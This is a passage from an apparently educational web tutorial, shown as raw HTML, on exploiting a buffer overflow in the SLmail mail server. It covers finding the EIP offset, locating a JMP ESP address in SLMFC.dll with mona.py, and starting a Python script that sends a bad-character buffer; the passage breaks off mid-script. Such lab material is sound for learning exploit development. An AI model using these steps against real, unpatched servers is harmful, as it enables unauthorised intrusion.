data-offset-key="2d0ef152eb78441fb859a747abd45dc8:0"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
[*] Exact match at offset 2606</code></span><span data-offset-key="2d0ef152eb78441fb859a747abd45dc8:1">

So the exact position of the EIP is </span><span data-offset-key="2d0ef152eb78441fb859a747abd45dc8:2"><strong class="bold-3c254bd9" data-slate-leaf="true">2606</strong></span><span data-offset-key="2d0ef152eb78441fb859a747abd45dc8:3">. </span></span></span></p><h2 id="redirect-execution-of-the-program" class="blockHeading-442b4f12--blockHeading2WithMargin-532d771d" data-key="9f2ba0a26eee45c284226234f58fef67"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="7813dbfa43ba411bb448b7a881e2953e"><span data-offset-key="7813dbfa43ba411bb448b7a881e2953e:0">Redirect execution of the program</span></span></span><a href="#redirect-execution-of-the-program" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><p class="blockParagraph-544a408c" data-key="b12d07eaf504494999a5cacf1d1f62bc"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="50f2acb722b348788df8d56cb05a4854"><span data-offset-key="50f2acb722b348788df8d56cb05a4854:0">The next step is to give the EIP (instruction pointer) directions to our malicious shellcode. How do we know where our shellcode will end up in memory? At this stage it&#x27;s helpful to see how these exploits are typically structured:</span></span></span></p><div data-slate-void="true" data-key="6cb6ef43b556417080b1bc48389d0b1b"><div><figure data-key="6cb6ef43b556417080b1bc48389d0b1b" contenteditable="false" class="reset-3c756112--figure-c0d4b308--figureWithCaption-408420be"><div class="reset-3c756112--figureAlignCenter-2d9bf702"><div class="reset-3c756112--figureLayer-b6ab7c94"><img tabindex="0" src="https://blobs.gitbook.com/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTy4mJZ1obv8guGsBqk%2F-LTy6h5PM8kC1O7NPz4_%2FScreen%20Shot%202018-12-17%20at%204.41.53%20PM.png?alt=media&amp;token=33f849e0-6d0a-4b36-9148-ce95511fc3b5" class="image-52799b3c" style="cursor:zoom-in"/></div></div><div class="reset-3c756112--figureAlignCenter-2d9bf702"><figcaption class="caption-8750cb6e"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width:100%">Buffer overflow exploit structure (simplified)</span></figcaption></div></figure></div></div><p class="blockParagraph-544a408c" data-key="573cb56c291a46b987abe04fbb486a99"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="af4f6802c49640c4b366aa7ad9b79567"><span data-offset-key="af4f6802c49640c4b366aa7ad9b79567:0">Recall that this exploit involves shoving a big string of characters into the SLmail password field. As shown in the diagram, the string starts out with some filler characters, enough to touch the EIP. Then we have the EIP, which contains a 4-byte memory address pointing to our shellcode. After the EIP, there is a </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://en.wikipedia.org/wiki/NOP_slide" target="_blank" rel="noopener noreferrer" data-key="830e1919bb9f42789335bfa47dadcfaa"><span data-key="5e67f630d61443d69d1af5d247e166e7"><span data-offset-key="5e67f630d61443d69d1af5d247e166e7:0">nop sled</span></span></a><span data-key="ea8c968ecadb4ddb814e9600dc8178e6"><span data-offset-key="ea8c968ecadb4ddb814e9600dc8178e6:0"> for wiggle room. Finally, we have our shellcode.</span></span></span></p><p class="blockParagraph-544a408c" data-key="085bb51ae37b42c185f89fb7bd8541ea"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="c7853fb297ea4a0dac2a17a4786a4d56"><span data-offset-key="c7853fb297ea4a0dac2a17a4786a4d56:0">Because of how this exploit string is structured, you&#x27;ll notice that the </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://security.stackexchange.com/a/181246" target="_blank" rel="noopener noreferrer" data-key="76a0a6c9e439456fb79bc78148e35e0f"><span data-key="4831e05033364709aa87ff37ee4f8b0b"><span data-offset-key="4831e05033364709aa87ff37ee4f8b0b:0">stack pointer (ESP) is pointing right at our payload.</span></span></a><span data-key="5bd01007727f4de78ae3813b27250b38"><span data-offset-key="5bd01007727f4de78ae3813b27250b38:0"> That means you don&#x27;t need to give the EIP the exact address of your shellcode - you can simply tell it to jump to the stack pointer and execute whatever is there. Conveniently, there is an instruction known as </span><span data-offset-key="5bd01007727f4de78ae3813b27250b38:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">JMP ESP</code></span><span data-offset-key="5bd01007727f4de78ae3813b27250b38:2"> which does exactly that! If you can find a </span><span data-offset-key="5bd01007727f4de78ae3813b27250b38:3"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">JMP ESP</code></span><span data-offset-key="5bd01007727f4de78ae3813b27250b38:4"> instruction somewhere else in the program, you can give its memory address to the EIP and it will jump to your payload.</span></span></span></p><h3 id="finding-jmp-esp" class="blockHeading-442b4f12--blockHeading3WithMargin-532d7700" data-key="2deda13b89f049a586dd8dea2e3cfe54"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH400-686c0942--textContentFamily-49a318e1"><span data-key="41bcb82afc2046508ae7e16b6902f484"><span data-offset-key="41bcb82afc2046508ae7e16b6902f484:0">Finding JMP ESP</span></span></span><a href="#finding-jmp-esp" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h3><p class="blockParagraph-544a408c" data-key="11bded1fd62d48ba822dc9df0fc017a1"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="baa1e9c423144b41897d07fcf869dcfc"><span data-offset-key="baa1e9c423144b41897d07fcf869dcfc:0">Using Mona.py, you can pull up a list of modules loaded with the SLmail program by typing </span><span data-offset-key="baa1e9c423144b41897d07fcf869dcfc:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">!mona modules</code></span><span data-offset-key="baa1e9c423144b41897d07fcf869dcfc:2"> into the bottom text box. The true/false columns in the middle show which ones were compiled </span><span data-offset-key="baa1e9c423144b41897d07fcf869dcfc:3"><strong class="bold-3c254bd9" data-slate-leaf="true">without </strong></span><span data-offset-key="baa1e9c423144b41897d07fcf869dcfc:4">buffer overflow protections (</span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://security.stackexchange.com/questions/18556/how-do-aslr-and-dep-work" target="_blank" rel="noopener noreferrer" data-key="61d4e62f35694066b9cc302d5ad44eb7"><span data-key="4fad3c4a813849728c8256383f07d189"><span data-offset-key="4fad3c4a813849728c8256383f07d189:0">DEP and ASLR</span></span></a><span data-key="67525b8f2fc64492ab940baa0bd61d6e"><span data-offset-key="67525b8f2fc64492ab940baa0bd61d6e:0">). </span><span data-offset-key="67525b8f2fc64492ab940baa0bd61d6e:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">SLMFC.dll</code></span><span data-offset-key="67525b8f2fc64492ab940baa0bd61d6e:2"> seems to fit the bill nicely.</span></span></span></p><div data-slate-void="true" data-key="26e851d08ede404394c26a34e7b74ef1"><div><figure data-key="26e851d08ede404394c26a34e7b74ef1" contenteditable="false" class="reset-3c756112--figure-c0d4b308--figureWithCaption-408420be"><div class="reset-3c756112--figureAlignCenter-2d9bf702"><div class="reset-3c756112--figureLayer-b6ab7c94"><img tabindex="0" src="https://blobs.gitbook.com/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTidfj5788QmC3_L_ce%2F-LTieU6Am0mzIIiE6AZj%2FScreen%20Shot%202018-12-06%20at%203.12.16%20PM.png?alt=media&amp;token=133d0843-a161-4e16-97f9-feca334409a4" class="image-52799b3c" style="cursor:zoom-in"/></div></div><div class="reset-3c756112--figureAlignCenter-2d9bf702"><figcaption class="caption-8750cb6e"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width:100%">use Mona.py to list all the modules loaded with the program</span></figcaption></div></figure></div></div><p class="blockParagraph-544a408c" data-key="5b7aee78df8e46c3bfc8d2aaea72324c"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="a452f26c6cb5432889269c40d2ffceaf"><span data-offset-key="a452f26c6cb5432889269c40d2ffceaf:0">Click the tiny </span><span data-offset-key="a452f26c6cb5432889269c40d2ffceaf:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">e</code></span><span data-offset-key="a452f26c6cb5432889269c40d2ffceaf:2"> button on Immunity’s top bar to bring up a list of executable modules and highlight SLMFC. Double-clicking on this item will show us the instructions in the DLL. We can then right-click and choose </span><span data-offset-key="a452f26c6cb5432889269c40d2ffceaf:3"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">Search for &gt; Command</code></span><span data-offset-key="a452f26c6cb5432889269c40d2ffceaf:4"> (or use Ctrl + F) to find a </span><span data-offset-key="a452f26c6cb5432889269c40d2ffceaf:5"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">JMP ESP</code></span><span data-offset-key="a452f26c6cb5432889269c40d2ffceaf:6"> command. If you don&#x27;t find one, you can search for the </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener noreferrer" data-key="57b384586d814e2ab56dcca2737c2c6d"><span data-key="a6ecdc12b6394e2eb8dc9f81401bb1ed"><span data-offset-key="a6ecdc12b6394e2eb8dc9f81401bb1ed:0">opcode</span></span></a><span data-key="047cc0589495493c97d29df112c599ce"><span data-offset-key="047cc0589495493c97d29df112c599ce:0">, which is </span><span data-offset-key="047cc0589495493c97d29df112c599ce:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">FFE4</code></span><span data-offset-key="047cc0589495493c97d29df112c599ce:2"> using Mona.py. Enter this command into the bottom text field:</span></span></span></p><p class="blockParagraph-544a408c" data-key="fcbb925c35734467889f71a3678075cd"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="9fa542d7145e4f57886829a72deb366a"><span data-offset-key="9fa542d7145e4f57886829a72deb366a:0"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">!mona find -s “\xff\xe4″ -m slmfc.dll</code></span></span></span></p><div data-slate-void="true" data-key="b67cee308bc34c698c9e7ac80585c8c3"><div><figure data-key="b67cee308bc34c698c9e7ac80585c8c3" contenteditable="false" class="reset-3c756112--figure-c0d4b308--figureWithCaption-408420be"><div class="reset-3c756112--figureAlignCenter-2d9bf702"><div class="reset-3c756112--figureLayer-b6ab7c94"><img tabindex="0" src="https://blobs.gitbook.com/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTifrrMvFn8k3ViZNTa%2F-LTik0qYbS-NSyYSlOcU%2FScreen%20Shot%202018-12-06%20at%203.31.32%20PM.png?alt=media&amp;token=bd98f277-b061-48b7-9f51-49a3a625f176" class="image-52799b3c" style="cursor:zoom-in"/></div></div><div class="reset-3c756112--figureAlignCenter-2d9bf702"><figcaption class="caption-8750cb6e"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width:100%">Find a JMP ESP command using its opcode FFE4</span></figcaption></div></figure></div></div><p class="blockParagraph-544a408c" data-key="70199d106c1d4c97b6ae91b8d2156ef9"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="0cdca16be6a34a96802fd94d9d8303ad"><span data-offset-key="0cdca16be6a34a96802fd94d9d8303ad:0">Record the memory address from the first result and </span><span data-offset-key="0cdca16be6a34a96802fd94d9d8303ad:1"><strong class="bold-3c254bd9" data-slate-leaf="true">flip it</strong></span><span data-offset-key="0cdca16be6a34a96802fd94d9d8303ad:2"> because of little endian nonsense: </span></span></span></p><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="25a952059c7a43cda4e9bc7e63b48e58" spellcheck="false" class="reset-3c756112--codeBlock-75b39b81"><div class="codeLine-a3169fbc" data-key="ae35c7e7c4804055b09be0a94b568161"><span data-key="0d914627e7e144edb24ff55923f07722"><span data-offset-key="0d914627e7e144edb24ff55923f07722:0">5F 4A 35 8F         # Address retrieved from Mona results</span></span></div><div class="codeLine-a3169fbc" data-key="66a7cec6d0374c49bc260e273a7d5083"><span data-key="83c603e03b244f3491ee6b1d38af06f5"><span data-offset-key="83c603e03b244f3491ee6b1d38af06f5:0">\x8f\x35\x4a\x5f    # How it looks in your final exploit</span></span></div></pre></div><p class="blockParagraph-544a408c" data-key="3acbf7ba33a546119ccdf5a74deaf709"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="80fb23a736a24294be889f14ffb24936"><span data-offset-key="80fb23a736a24294be889f14ffb24936:0">(here&#x27;s a </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://stackoverflow.com/questions/16903192/meaning-of-0x-and-x-in-python-hex-strings" target="_blank" rel="noopener noreferrer" data-key="c3a5755352e84202b11846b77b1cce0c"><span data-key="e11d78367af14e66ad3eb6db77bdce82"><span data-offset-key="e11d78367af14e66ad3eb6db77bdce82:0">quick explanation</span></span></a><span data-key="d1efeeb4acf04b08a42e99f347d6a4ef"><span data-offset-key="d1efeeb4acf04b08a42e99f347d6a4ef:0"> of the </span><span data-offset-key="d1efeeb4acf04b08a42e99f347d6a4ef:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">\x</code></span><span data-offset-key="d1efeeb4acf04b08a42e99f347d6a4ef:2"> and </span><span data-offset-key="d1efeeb4acf04b08a42e99f347d6a4ef:3"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">0x</code></span><span data-offset-key="d1efeeb4acf04b08a42e99f347d6a4ef:4"> stuff you see around hex codes)</span></span></span></p><h2 id="make-shellcode" class="blockHeading-442b4f12--blockHeading2WithMargin-532d771d" data-key="bd0e6ed62d2943e49b0cd6d74122e7ec"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="00a5a0fd2c9f4f7ea6ba5215c9784ba1"><span data-offset-key="00a5a0fd2c9f4f7ea6ba5215c9784ba1:0"><strong class="bold-3c254bd9" data-slate-leaf="true">Make shellcode</strong></span></span></span><a href="#make-shellcode" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><p class="blockParagraph-544a408c" data-key="6ece7d1887c44f05986f183178200066"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="92ba6ef8fef147bebdc4b6b9197a181b"><span data-offset-key="92ba6ef8fef147bebdc4b6b9197a181b:0">Now that we&#x27;ve built the first part of our exploit, we can prepare some malicious shellcode that can be successfully executed by the program.</span></span></span></p><p class="blockParagraph-544a408c" data-key="2e460196a4d74c2ea3bd58bcddfe972f"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="18029e0652e44cb884ed1804fa65416c"><span data-offset-key="18029e0652e44cb884ed1804fa65416c:0">In order to run, the shellcode can&#x27;t contain characters that will be interpreted incorrectly by the program you are exploiting (such as newline). These can be identified by overflowing the buffer until the EIP is overwritten, then inserting the </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://www.rapidtables.com/code/text/ascii-table.html" target="_blank" rel="noopener noreferrer" data-key="bf7dfe46023b43aab9951c2a9349ff46"><span data-key="2943f0d24d4b4a29855e07d72d00f6c4"><span data-offset-key="2943f0d24d4b4a29855e07d72d00f6c4:0">hex representation of all ASCII characters</span></span></a><span data-key="cfae4d12479b4e7386fa75712335b5e6"><span data-offset-key="cfae4d12479b4e7386fa75712335b5e6:0">:</span></span></span></p><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="7712582793864fd79ed4483f7c3b4598" spellcheck="false" class="reset-3c756112--codeBlock-75b39b81"><div class="codeLine-a3169fbc" data-key="039b0c9675d64ebbb65dc36ab5d1561d"><span data-key="d7d2ffc4744c4ef1b44f43b562815801"><span data-offset-key="d7d2ffc4744c4ef1b44f43b562815801:0"><span class="prism-token token  comment ">#!/usr/bin/python</span></span></span></div><div class="codeLine-a3169fbc" data-key="397de34e1bdd4862926f78368b4efcec"><span data-key="ee59ee96656e4907bd9c6a0cad279ed8"><span data-offset-key="ee59ee96656e4907bd9c6a0cad279ed8:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="8b94512ce17f46aa91648b7e4557c146"><span data-key="297d366b4b244487b0fc50c751c19226"><span data-offset-key="297d366b4b244487b0fc50c751c19226:0"><span class="prism-token token 2 keyword ">import</span></span><span data-offset-key="297d366b4b244487b0fc50c751c19226:1"><span class="prism-token token 3"> socket</span></span></span></div><div class="codeLine-a3169fbc" data-key="bd1e7e417b3a4c99a6bb105522512dd8"><span data-key="626072109b764fc3a7e1d90b8970488f"><span data-offset-key="626072109b764fc3a7e1d90b8970488f:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="eb9e8c57e98b4830856660e12d3dc944"><span data-key="43a072f2062044e1a4d06627f5ad67d5"><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:0"><span class="prism-token token 3">s </span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:1"><span class="prism-token token 4 operator ">=</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:2"><span class="prism-token token 5"> socket</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:3"><span class="prism-token token 6 punctuation ">.</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:4"><span class="prism-token token 7">socket</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:5"><span class="prism-token token 8 punctuation ">(</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:6"><span class="prism-token token 9">socket</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:7"><span class="prism-token token 10 punctuation ">.</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:8"><span class="prism-token token 11">AF_INET</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:9"><span class="prism-token token 12 punctuation ">,</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:10"><span class="prism-token token 13"> socket</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:11"><span class="prism-token token 14 punctuation ">.</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:12"><span class="prism-token token 15">SOCK_STREAM</span></span><span data-offset-key="43a072f2062044e1a4d06627f5ad67d5:13"><span class="prism-token token 16 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="27bbcd29f0654b1fa671a0620d20d85a"><span data-key="3c18725c234542d6b71369fa15672328"><span data-offset-key="3c18725c234542d6b71369fa15672328:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="fc54dcbbc7044f848af324851b40706e"><span data-key="0403f757035e4976b6e0a38d58378f13"><span data-offset-key="0403f757035e4976b6e0a38d58378f13:0"><span class="prism-token token 18 comment "># Create a variable to hold all ASCII characters </span></span></span></div><div class="codeLine-a3169fbc" data-key="654b597469e74b179349bdbc11b8d292"><span data-key="dd0ebefebca64b56a545cb179df4fc5a"><span data-offset-key="dd0ebefebca64b56a545cb179df4fc5a:0"><span class="prism-token token 19">badchars </span></span><span data-offset-key="dd0ebefebca64b56a545cb179df4fc5a:1"><span class="prism-token token 20 operator ">=</span></span><span data-offset-key="dd0ebefebca64b56a545cb179df4fc5a:2"><span class="prism-token token 21"> </span></span><span data-offset-key="dd0ebefebca64b56a545cb179df4fc5a:3"><span class="prism-token token 22 punctuation ">(</span></span></span></div><div class="codeLine-a3169fbc" data-key="d18e85cc88fe41d6b624cfa1fedc119a"><span data-key="383282e7d4b74ad0a8f2c9ce8a09c3c0"><span data-offset-key="383282e7d4b74ad0a8f2c9ce8a09c3c0:0"><span class="prism-token token 24 string ">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="6ea54cd5e231448c805167099c70e2a2"><span data-key="330685c41c6e4fe5afdf668826db882b"><span data-offset-key="330685c41c6e4fe5afdf668826db882b:0"><span class="prism-token token 26 string ">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="ab14b081df7841f2aaba6b9db1889246"><span data-key="cdae50cc7cd545f698f1f5642dad20a5"><span data-offset-key="cdae50cc7cd545f698f1f5642dad20a5:0"><span class="prism-token token 28 string ">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="09105a4f568a4a83bdb75ee35e59524c"><span data-key="83d79487099945aea79d379e6de23ebb"><span data-offset-key="83d79487099945aea79d379e6de23ebb:0"><span class="prism-token token 30 string ">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="98cb7449d7a04b88821d00a15e919bf1"><span data-key="7b4f12db70d948b8a74e72a5c8336324"><span data-offset-key="7b4f12db70d948b8a74e72a5c8336324:0"><span class="prism-token token 32 string ">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="1da4699c1b574263b7c11ac11c979c58"><span data-key="4e2f08614b85418f96d38554f1b64c20"><span data-offset-key="4e2f08614b85418f96d38554f1b64c20:0"><span class="prism-token token 34 string ">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="13756d8e23834686af512fc2e33f209c"><span data-key="56547cc46e1d495a84a3f253bb4011bc"><span data-offset-key="56547cc46e1d495a84a3f253bb4011bc:0"><span class="prism-token token 36 string ">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="50fb6b6399ca47699287e35bc1a16e96"><span data-key="7cd0f37b81ce4040bbd88ee23e717ec9"><span data-offset-key="7cd0f37b81ce4040bbd88ee23e717ec9:0"><span class="prism-token token 38 string ">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="df95a5337b254ac0ad4a99ccfb438f06"><span data-key="710757e6f4e2488c828df22b665b683f"><span data-offset-key="710757e6f4e2488c828df22b665b683f:0"><span class="prism-token token 40 string ">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="115b3fa2e1f24daea01b14264733a583"><span data-key="71ab741ae78f4b5a82a75e3d9b59eb0c"><span data-offset-key="71ab741ae78f4b5a82a75e3d9b59eb0c:0"><span class="prism-token token 42 string ">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="e00d4ce8b1b74fa68394148b6ed9e226"><span data-key="4fca65d2022d43dc8c944669bb6ceaf9"><span data-offset-key="4fca65d2022d43dc8c944669bb6ceaf9:0"><span class="prism-token token 44 string ">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="c9acebf9a49342e7881a6e6fdd752612"><span data-key="11b87fa5b34247d384895fbdc1ff8981"><span data-offset-key="11b87fa5b34247d384895fbdc1ff8981:0"><span class="prism-token token 46 string ">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="d12494c1ef814c0a845dd49e00c4019a"><span data-key="3d1f28479e094aa0beb83f49cfde9b4e"><span data-offset-key="3d1f28479e094aa0beb83f49cfde9b4e:0"><span class="prism-token token 48 string ">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="78b13058b5c84fa7951d77ab03123432"><span data-key="6c038a9d2d3c48748e71937198f6f658"><span data-offset-key="6c038a9d2d3c48748e71937198f6f658:0"><span class="prism-token token 50 string ">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="a5b82228bbdf4b4c856ed4726c6261bf"><span data-key="14d762e502b7498ca3fb02533216d08c"><span data-offset-key="14d762e502b7498ca3fb02533216d08c:0"><span class="prism-token token 52 string ">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="932fece66f2343d3bf0a8f2412bd1ada"><span data-key="b63bdf3dace44957991b0376328a4304"><span data-offset-key="b63bdf3dace44957991b0376328a4304:0"><span class="prism-token token 54 string ">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><span data-offset-key="b63bdf3dace44957991b0376328a4304:1"><span class="prism-token token 55"> </span></span><span data-offset-key="b63bdf3dace44957991b0376328a4304:2"><span class="prism-token token 56 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="9123ac4daa584465abad4e4690682f0a"><span data-key="71c2a0a837e347ff8dd57121722f3505"><span data-offset-key="71c2a0a837e347ff8dd57121722f3505:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="da17218e9e384dcd88745f4644644179"><span data-key="b09a2b4a55c14f9b942c74201513355e"><span data-offset-key="b09a2b4a55c14f9b942c74201513355e:0"><span class="prism-token token 58 comment "># Create a buffer of 2606 As, 4 Bs and the ASCII characters</span></span></span></div><div class="codeLine-a3169fbc" data-key="6a2be46b0c3d47dd942684014ba622b9"><span data-key="fbcf836706534db984e889a66fa0680c"><span data-offset-key="fbcf836706534db984e889a66fa0680c:0"><span class="prism-token token 60 builtin 